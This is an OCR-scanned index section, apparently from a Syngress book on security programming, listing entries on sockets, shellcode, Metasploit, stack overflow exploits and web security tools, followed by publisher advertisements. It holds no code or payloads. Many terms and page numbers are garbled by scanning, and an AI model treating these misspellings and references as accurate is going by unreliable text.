setting, 495-496 
setting for exploit, 529 
Ritchie, Dennis, 3 
Rogerson, Dale, 540, 589 
RPC (Remote Procedure Call), 
127-139 
RPCi_lD_HHAD value, 137 
RPCIJIiJlAII, 
value, 
137 
rpcl.c program, 127-139 
RPCDump utility 
adding COM extensions to, 
overview, 567—568 
application integration rou-
tines, 573-575 
COM.EXE server imple-
mentation, 568-571 
component classes, 578-584 
COMSupport.h, 584-585 
control How, 571—572 
described, 588 
RPCDump, C, 585-587 
tool interface definition, 
575-578 
rptid() function, 138 
rptidport() function, 138 
RPORT (remote port), 495^96 
runtime, COM, 541-542 
s 
sandbox 
definition of, 631 
with Java, 16 
sanity check, 433 
MM* command, 497 
scalars, 41 
srai>() function, 138 
scanners, 638 
screen flicker, 591 
script syntax, NASL, 68-77 
Secure Sockets Layer (SSL), 219 
security 
of C#, 25-26 
of C/C++, 4-5 
of Java, 16 
of NASL scripts, 67 
security coding 
C#, 23-40 
C/C++, 
3-14 
Java, 14-23 
Perl, 40-55 
programming languages, para-
digms, 2-3 
Python, 55-59 
security components, writing 
ATL, 546-567 
COM, 540-546 
COM extensions, adding to 
RPCDump tool, 567-587 
overview, 540 
security features, programming 
languages, 2 
security library tools, 636 
security policy, C#, 25 
security tools. See tools 
select0 function, 293-298 
sendQ function 
portable network program-
ming and, 298-301 
sending UDP datagram with, 
109-112 
UDP socket and, 108 
in Winsock server applica-
tion, 161 
for Winsock WSADATA 
object creation, 152 
setid_exploit() function, 167-168 
sendmail, 431—432 
sendtoQ function 
portable network program-
ming and, 298-301 
sending UDP datagram with, 
112-113 
UDP socket and, 108 
sequence number generation, 
429-430 
serial handling,TCP 
connections, I 94-195 
server applications 
BSD sockets used by, 1(H) 
TCP client/server sockets, 
101-107 
TCP server socket program-
ming with Java Sockets, 
189-193 
UDP client/server sockets, 
107-116 
Winsock, writing, 158-161, 
170 
scrverQ function, 161 
server implementation, COM 
EXE, 568-571 
server technologies, ATL 
class composition, 550-553 
class registration, 556-559 
COM IN-PROCESS server 
implementation, 559-561 
COM OUT-OF-PROCESS 

664 
Index 
server implementation, 
561—563 
Interface Definition Language 
(IDL), 553-556 
server 1.c program, 103—107 
ServerAPP.exe, 158-161 
server-side socket prog ran lining, 
441-442 
SerrerSocket accept (} method, 193 
ServerSocket class, 194-204 
for TCP server socket pro-
gramming, 189-193 
for WimtsCauher program, 
204-209 
service programming, 256—262 
Service Provider Interface (SP1), 
631 
set command 
in Metasploit Framework, 
528 
setting exploit options in 
msfconsole, 496 
setg command, 496 
SeOUquest value, 118-119 
setsockoptQ function 
portable network program-
ming and, 307-309 
setting BSD socket options 
with, 116-118 
setuid shellcode, 349-350 
shared library 
bouncing in buffer overflow, 
505-506 
finding return address, 
509-513 
overwriting return address, 
504 
possible changes in, 513 
Shell (sh), 2 
she lie ode 
accept system call, 385 
addressing problem, 339-341 
definition of, 631 
dup2 system call, 385-386 
encoding, 402^107 
execve, 372-380 
execve system call, 386-3'J 1 
existing, 412—416 
in exploits, 435 
file descriptors, reusing, 
396-402 
listen svstem call, 384 
local shelkode, 348-354 
Metasploit Framework and, 
536 
NULL byte problem, 
341-342 
OS-spanning, 411—412 
overview, 334-339, 366-368 
payload term and, 504-505 
port binding, 380-383 
program variables, reusing, 
407-411 
remote, 345-348 
reverse connection, 391—394 
socket reusing, 394-396 
socket system call, 383-384 
svstem calls, implementing, 
342-345 
tools, 634 
Windows, 354-359 
Write system call, 368-372 
Shepherd, George, 589 
show explain command, 493, 494 
show Options command, 495-496 
S1GALRM signal, 138 
sigkattdlerQ function, 138 
signal handler, 431-432 
signal race conditions 
description of, 431 
sendmail race condition, 
431-432 
signal urgent (S1GUKG) signal 
handler, 431-432 
signals, portable code, 242—244 
signature analysis, 605-616 
signature files, 621 
signature tests, 595-596 
signed, 631 
SIGPIPE signal, 138 
SIGURG (signal urgent) signal 
handler, 431-432 
Simple Network Management 
Protocol (SNMP), 
118-127 
64-bit operating systems 
vs. 32-bit for portable code 
creation, 270-271 
portable network prograili-
ming and,330-332 
size checks, 475-477 
Slapper worm, 412-413, 416 
sleep, 354-359 
smart pointers, 547-548 
"Smashing the Stack for Fun 
and Profit" (Levy), 4 
sniffers, 171 
SNMP (Simple Network 
Management Protocol), 
118-127 
SNMPagent,119 
sutiipi.c program, 119-127 
SO_RGl^flMEO 
option, 
116-118 
,SOCK_DGrMM 
UDP socket creation, 109 
m Wiusock client application, 
157 
WSADATA object creation, 
150 
SOCK_STREAM 
in Wiusock client application, 
157 
WSADATA object creation, 
150 
$ockaddr_in stru ctu re 
receiving UDP datagram, 
115, 116 
sending UDP datagram, 111, 
113 
wckelO function, 280-282 
socket address structure, 441-442 
Socket class 
IP address/host name resolu-
tion with, 183 
TCP client socket program-
ming, 179 
socket descriptor 
reuse shellcode, 346-348 
UDP, 107 
socket( domain, type, protocol), 
643 
todta'() function 
client socket creation with, 
101 
function of, 100 
TCP client/server socket cre-
ation, 102, 105 
UDP socket creation, 109 
UDP socket programming, 
107 
UDP socket, sending, 111 
Socket objects, 195-204 
socket reusing shellcode, 
394-396 
socket system call, 383-384 
s ticket call ( callnumhcr. 
arguments ), 642-643 
socketcall system call, 412—416 
sockets 
coding for exploits, 440-444, 
488^ 
endpoint identified by, 100 
initializing, 442 
remote exploits and, 435 
replicating, 63 
tor SI'-Rebel connection 
management, 596—605 
. See also Berkeley Software 
Distribution (BSD) sockets; 
Java Sockets; Windows 
Sockets 
software 
closed-source, stack overflow 
exploits in, 454-455 
open-source, stack overflow 
exploits in, 449-454 
software bug, 63 1 
s oftwa re vu In e rab il i ty 
prevention, 437 
SOL_SOCKET option, 
118 
source code 
linking Wiusock to library 

Index 
665 
through, 148-149 
porting to/from NASL and, 
86-87 
source code auditing 
compilers, 634-635 
dcbuggers, 634 
hardware simulators, 635 
network traffic analysis, 637 
packet generation, 638 
scanners, 638 
security libraries, 636 
shellcodc tools, 634 
vulnerability analysis, 
636-637 
source port field, 107 
space limitations, 51 5—516 
special variables, Perl, 46-47 
SPI (Service Provider Interface), 
631 
spoofing 
TCP blind spoofing attack, 
429-430 
Web spoofing, 23 
SP-Rebel 
attack signatures, 595 
compilation, 619 
connection management and 
"packet cannon", 596-605 
design of, 594-595 
execution, 619-620 
header files, 616-619 
output from default minimal 
output settings, 620 
overview', 621—622 
parsing, 605-616 
parts of, 595-596 
speed of, 623 
Web application tools, 594 
SQL (Structured Query 
Language), 631 
SSL (Secure Sockets Layer), 219 
stack 
control vector selection for 
buffer overflow, 504—509 
definition of, 631 
finding return address, 
509-513 
stack memory, 536-537 
stack overflow 
definition of, 631 
Web-based vulnerability and, 
622 
stack overflow exploits 
finding in closed-source soft-
ware, 454-455 
finding in open-source soft-
ware, 449-454 
memory organization, 
444-445 
overview, 444, 488 
stack overflows, 446^149 
standard arrays, NASL, 70 
standard calling convention 
(stdcall), 541 
STDERR variable, 47 
STDIN variable, 47 
STDOUT variable, 47 
strace program, 335 
strcpy, 632 
string arrays, NASL, 70 
string "dot" notation, 183-185 
string functions, 341-342 
string 
m_str|VDBE_FIELD_C 
NT|,618 
string manipulation functions, 
NASL, 78 
String object, 183-184 
string operators 
NASL, 72 
in Perl, 44^15 
STRI\:C_MAX, 
156 
strings 
in NASL, 96 
in NASL script, 68-69 
Perl log modification utilitv, 
50-55 
shellcodc addressing problem, 
339 
strncpy, 632 
Stroustrup, Bjarne, 3 
strtnm, 609 
struct kestent function, 150-151 
struct keyword, 7 
Structured Query Language 
(SQL), 631 
subnet IP address parsing. Perl, 
45-46 
subst function, Perl, 47 
substitution, Perl, 47-48 
Sun Microsystems, 15 
Sun Solaris, 423-424 
symbolic link, 431 
syntax, NASL script, 68-77 
SysCall Trace, 401 
syslog function, 427-429 
systcmf) call, 432,433 
system call 39, 411-412 
system calls 
in assembly code, 336 
reference, 641—643 
shellcodc addressing problem 
and,339-341 
system calls, implementing 
arguments, 343-344 
numbers, 342 
overview, 361 
return values, 344—345 
T 
t_delete function, 470-471 
target 
selecting in Metasploit 
Opcode Database, 511 
selecting in msfconsole, 495 
StarJet variable, 532 
targeting array, Metasploit 
Framework, 53 I 
'Targets key, 531 
TCP connect scanning, 128—139 
TCP header file, 316-317 
TCPCUwtl.java, 
179-182 
TCPCMau2.java, 186-189 
TCPScrvert program, 193-194 
TCPS.enxri.jam, 
190-193 
TCPS.erver2.java, 196-204 
"Teletype Model 33" 
(computer), 69 
Telnet, 632 
templates, C++, 546-547 
testQ function, 139-140 
test string, 514—5 I 5 
text-based input/output, 
186-189 
texting, shellcode, 364 
32-bit Intel architecture (IA32), 
444- 446 
32-bit operating systems 
vs. 64-bit for portable code 
creation, 270-271 
portable network program-
ming and, 330-332 
thread coordination, 237-242 
thread pool, 195-204 
thread_antisl, 202 
threading 
C#, 31-32 
multiple TCP client connec-
tions, 194-204 
multithreading, 139-140 
Tltreadpaoi class, 201, 202 
Thtowttbie class, 203 
Time Of Check Time Of Use 
(TOCTOU) bug, 430 
timed event, 430-431 
timeout, BSD socket option, 
116-118 
Amp directory, 430-431 
tools 
advanced, 540 
for checking portable code, 
271 
compilers, 634—635 
debuggers, 634 
GNU debugger, 408-409 
hardware simulators, 635 
network traffic analysis, 637 
packet generation, 638 
RegSvr32, 543 
RPCDump, 567-587 
scanners, 638 
security libraries, 636 
shellcode tools, 634 
tool interface definition, 
RPCIJump utility, 575-578 

666 
Index 
vulnerability analysis, 
636-637 
Whisker, 594 
Transmission Control Protocol 
(TCP) 
application-1 evel com11innica-
tion with, 178-179 
client socket programming 
with Java Sockets, 179-182 
client/server socket program-
ming, 101-107, 141 
IP address retrieval, 184-185 
multiple con nee t ions, TCP 
client, 194-204 
server socket programming 
with Java Sockets, 189-193 
socket in Merasploit, 533 
socket programming with 
Java Sockets, 217-218 
sockets, network scanning 
with, 127-139 
spoofing attack, 429-430 
text-based input/output, 
186-189 
Web browser to connect to 
TCPScrverl, 193-194 
Winsock client application, 
154-158 
Winsock server application, 
158-161 
WormCatcher program tbr 
TCP client connections, 
204-209 
Transmission Control 
Protocol/Inter net 
Protocol (TCP/IP) 
] l! address/hostname ivsnlii 
tion, 183-185 
multiple connections, 
194-204 
overview, 178—179 
TCP client socket program-
ming, 179-182 
TCP server socket program-
ming, 189-193 
text-based input/output, 
186-189 
UDP client/server socket 
programming, 209—216 
vulnerabilities,""429-430, 436 
Web browser to connect to 
TCPScrver 1, 193-194 
WormCauher program. 
204-209 
try-cnkli handler 
for IP address retrieval, 185 
TCP client socket program-
ming with Java Sockets, 182 
TCP server socket tor client 
connections, 201 
TCP server socket program-
ming, 193 
two-staged attack, 423-424 
typedef, 6-7 
type-safety, 26 
u 
UDP Sec User Datagram 
Protocol 
UDP header file, 315-316 
udp t.e program, 108—109 
udp2.c program, 109-112 
ndpi.c program, 112—113 
udp4.c program, 113-116 
Uutidcf statement, 223 
UNIX 
BSD sockets, 100 
13SD sockets and, 143 
dawn of, 2 
unsigned, 632 
URLCoimcctum class, 219 
usageQ function 
R.PC program number iden-
tification, 138 
in SP-Rebel code, 604 
use command, 527 
User Datagram Protocol (UDP) 
application-level communica-
tion with, 178-179 
client/server socket program-
ming, 107-116, 141-142 
network scanning with UDP 
sockets, 118-127 
socket options, setting, 
116-118 
socket programming with 
Java Sockets, 209-216, 218 
user-defined functions, NASL, 
76-77 
UserQpts values, 529 
UW POP2, 480-487 
W7_arj; variable, 426 
Van Rossum, Guido, 7*5 
variable number, 425-426 
variables 
data tvpes and, 5 
NASL. 95 
NASL script syntax, 68-70 
Perl special variables, 46—47 
VAKIANT datatvpe, 548-550 
VDBE_I3EGTOK, 614,615 
VDBE_ENDTOK,615, 616 
VDBE_ESC, 615 
VI Mil-: IM'OK,(>].=., Mf> 
VDBE_NXTTOK, 616 
vector<VulnDBEntrv *>m_vec, 
616 
vers ion ing, C#, 25 
virtual machine, 632 
Virtual Operating Systems 
(VMs),330 
Visual Studio 
Web security tool compila-
tion, 619 
for Windows shelleode, 354, 
357 
Visual Studio 6.0, 148,149 
VMs (Virtual Operating 
Systems), 330 
VultiDB 
compilation, 619 
execution, 619—620 
header files, 616-619 
output from default minimal 
output settings, 620 
parsing, 605-616 
for Web security tool, 596 
VubiDBEntry 
compilation, 619 
execution, 619-620 
header files, 616-619 
output from default minimal 
output settings, 620 
parsing, 605-616 
for Web security tool, 596 
VulnDB.hfile,616-619 
vulnerability 
analysis tools, 636-637 
definition of, 632 
exploits, writing, 422 
format string attacks, 
424-429 
man input validation error, 
432-434 
race conditions, 430—4-32 
remote/Iocal exp 1 oits, 
423-424 
shelleode and, 334 
targeting, 422-423, 435 
TCP/IP exploits, 429-430 
Web security tool to search 
for, 594 
vulnerability cheeking program, 
161-168 
vulnerability signature, 594-595 
w 
Wall, Larry, 40 
Web attack, 172-173 
Web browser 

Index 
667 
to connect to TCPServerl, 
193-194 
Hotjava, 15 
Web grabber, 153-154 
Web hacking, 623-624 
Web interface, 523-526 
Web security tool, S-P Rebel 
attack signatures, 595 
compilation, 619 
connection management, 
596-605 
design of, 594-595 
execution, 619—620 
header files, 616-619 
output from default minimal 
output settings, 620 
parsing, 605-616 
parts of, 595-596 
Web application tools, 594 
Web server hack, Perl, 49-50 
Web Services Addressing, 604, 605 
Web signatures, 596 
Web sites 
BSD socket resources, 143 
CI RT/Application Defense 
Web sites, 622 
exploit archives, 640 
for exploits, 489^S90 
exploits, writing, 436—437 
with exploits posted on, 87 
Metasploit Framework, 498 
Metasploit 
Framework/exploits, 535 
Meterpreter, 519 
Nessus, 97 
random number generation 
research, 430 
security coding, 62 
for security components, 
588-589 
security tools, 634—638 
for shellcode, 418 
shellcode resources, 362 
shellcode tools, 335 
Web spoofing, 23 
Winsock resources, 170 
Web spoofing, 23 
Web-based vulnerability, 622 
While loop 
in C # , 28,29 
in C/C++, 8,9 
in Java, 19 
in NASL, 75 
in Perl log modification 
example, 54, 55 
Whisker (Web security tool), 
594 
whitespace, 605, 608, 609 
Win32 
output. See portable code 
service programming, 
256-262 
Windows NT 4 IIS 4.0 host, 
493-498 
Windows shellcode 
description, 362 
overview, 354—359 
writing, 339 
Windows Sockets (Winsock) 
client applications, writing, 
154-158 
to execute remote buffer 
overflow, 174-176 
to execute Web attack, 
172-173 
explo it/vu 1 ne ra biliry 
checking programs, writing. 
161-168 
linking to library, 152 
overview, 146—147 
portable network program-
ming and, 274—276 
server applications, writing, 
158-161 
for SP-Rebel connection 
management, 596-605 
starting new workspace, 148 
Web grabber, building, 
153-154 
WinPcap, 323-328 
Winsock 2.0 
linking to library, 148-152 
overview, 169 
starting new workspace, 148 
Winsock 2.0 extensions 
ticcept() extension, 290-293 
bsndQ extension, 285—287 
dose/dosesocketf) extensions, 
305-306 
cormectO e xt e n si on, 2 82-2 8 5 
UstcnQ extension, 287-290 
hctl/locthocketQ extensions, 
309-312 
portable network program-
ming and, 280 
read()/ writeQ extensions, 280 
rea>/reivfrom() extensions, 
301-304 
seleetQ extension, 293-298 
send/sendtoQ extensions, 
298-301 
senoekoplQ extension, 
307-309 
socketQ extension, 280-282 
Winsock I API, 146,147 
Winsock2API, 146-147 
Worker't'hread class, 202 
WnrkerThread class, 204-209 
World Wide Web (WWW) 
need for Web security tool, 
594 
Perl's popularity and, 40 
WormCauher program, 204—209 
writeQ function, 108 
Write system call, 368-372 
Writing Compilers and Interpreters 
' (Mak),220 
WSAChiinitpQ function, 152 
WSADATA object, 149-152 
WSAStartnpO function 
portable network program-
ming and, 275 
WSADATA object creation, 
150 
tt> Version property, 149 
X 
XUR64.2XLOCALEDIR 
vulnerability, 450-454 
x86 architecture 
[.Ictmition ot, 632 
nop sleds and, 517, 518 
x86 opcodes, 509 
xlockmore, 427-429 
z 
Zalwski, Michael, 430 
OxCC opcode, 515-516 

Syngress: The Definition of a 
Serious Security Librar 
4 FREE lOOflLETS I 
Buffer 
Overflow 
Attacks 
AVAILABLE NOW 
order @ 
www.syng res s.com 
|rcs): noun, sing. Freedom 
r; safety. See security. 
Buffer Overflow Attacks: 
Detect, Exploit, Prevent 
James C. Foster, Foreword by Dove Aitel 
The SANS Institute maintains a list of the Top 10 Software Vulnerabilities," At the 
current time, over half of these vulnerabilities are exploitable by Buffer Overflow 
attacks, making this class of attack one of the most common and most dangerous 
weapon used by malicious attackers. This is the first book specifically aimed at 
detecting, exploiting, and preventing the most common and dangerous attacks. 
ISBN: 1 -932266-67-4 
Price: $34.95 US $50.95 CAN 
AVAILABLE NOW 
order@ 
www.syngress.com 
Programmer's 
Ultimate Security DeskRef 
James C. Foster 
The Programmer's Ultimate Security DeskRef is the only complete desk reference 
covering multiple languages and their inherent security issues. It will serve as the 
programming encyclopedia for almost every major language in use. 
While there are many books starting to address the broad subject of security 
best practices within the software development Iirecycle, none has yet to address 
the overarching technical problems of incorrect function usage. Most books fail 
to draw the line from covering best practices security principles to actual code 
implementation. This book bridges that gap and covers the most popular pro-
gramming languages such as Java, Perl, C++, C#, and Visual Basic. 
ISBN: 1 -932266-72-0 
Price: $49.95 US $72.95 CAN 
Programmer's,...,,, 
Security DeskRef 
* " " ! ' 
H l m ^ H j t M i 
P^ 
Hacking 
the Code 
KMETWrtlHllciIloiUcirln 
AVAILABLE NOW 
I order @ 
I w w w . s y n g r e s s . c o m 
Hacking the Code: 
ASP.NET Web Application Security 
Mark Burnett 
This unique book walks you through the many threats to your web application 
code, from managing and authorizing users and encrypting private data to 
filtering user input and securing XML, For every defined threat, it provides a 
menu of solutions and coding considerations. And, it offers coding examples and 
a set of security policies for each of the corresponding threats. 
ISBN: 1-932266-65-8 
Price: $49.95 U.S. $79.95 CAN 
i of the corres 
Jm*
r 
m 
* 
S Y N G R E S S * 

